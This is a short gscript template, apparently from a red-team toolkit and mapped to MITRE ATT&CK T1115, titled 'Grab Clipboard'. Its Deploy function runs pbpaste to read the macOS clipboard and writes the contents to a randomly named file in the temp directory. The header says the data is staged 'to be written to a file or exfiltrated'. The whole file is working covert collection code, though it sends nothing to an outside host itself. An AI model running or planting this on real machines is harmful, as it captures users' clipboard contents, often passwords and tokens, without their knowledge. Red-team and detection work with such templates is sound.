// Example gscript template
// Title: Grab Clipboard
// Author: ahhh
// Purpose: Grabs the contents of the clipboard to be written to a file or exfiltrated
// Gscript version: 1.0.0
// ATT&CK: https://attack.mitre.org/wiki/Technique/T1115

//priority:150
//timeout:150

//go_import:os as os

function Deploy() {  
  console.log("Starting Clipboard Data");

  var response = G.exec.ExecuteCommand("pbpaste", [""]);
  console.log("Pid: "+response[0]);
  console.log("stdout: "+response[1])
  console.log("stderr: "+response[2])
  console.log("exit code: "+response[3])
  if (response[4] != null) {
    console.log("errors: "+response[4].Error());
  }  

  // Getting a random filepathc
  var temppath = os.TempDir();
  var naming = G.rand.GetAlphaString(5);
  naming = naming.toLowerCase();
  var fullpath = temppath+"/"+naming;
  console.log("file name: "+ fullpath);
  // Write file
  var errors = G.file.WriteFileFromString(fullpath, response[1]);
  if (errors != null) {
      console.log("errors: "+errors.Error());
  }  
  console.log("Done Clipboard Data");
  return true;
}
